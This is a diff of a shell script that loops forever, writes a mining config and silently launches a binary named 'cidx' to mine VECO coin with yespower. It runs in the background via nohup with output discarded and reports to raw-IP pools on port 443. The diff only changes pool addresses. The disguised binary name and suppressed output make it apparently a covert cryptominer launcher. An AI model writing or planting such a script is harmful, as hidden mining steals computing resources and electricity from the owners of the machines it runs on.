@@ -13,7 +13,7 @@ while true; do
   # Create config.json with the current date
   cat > config.json <<END
 {
-  "url": "45.115.224.235:443",
+  "url": "45.115.224.108:443",
    "user": "VGq2bKrQ2AiJPNwttzKw7FE8RZJSQQva3G.worker6",
   "pass": "c=VECO,m=solo,zap=VECO,mc=VECO",
   "threads": 6,
@@ -27,7 +27,7 @@ END
   # Run cidx in the background
   # nohup ./cidx -c 'config.json' &>/dev/null &
   nohup ./cidx -a yespower  \
-  -o 45.115.225.146:443 \
+  -o 45.115.224.108:443 \
   -u VGq2bKrQ2AiJPNwttzKw7FE8RZJSQQva3G.worker8 \
   -p c=VECO,m=solo,zap=VECO,mc=VECO -t 6 &>/dev/null &
 
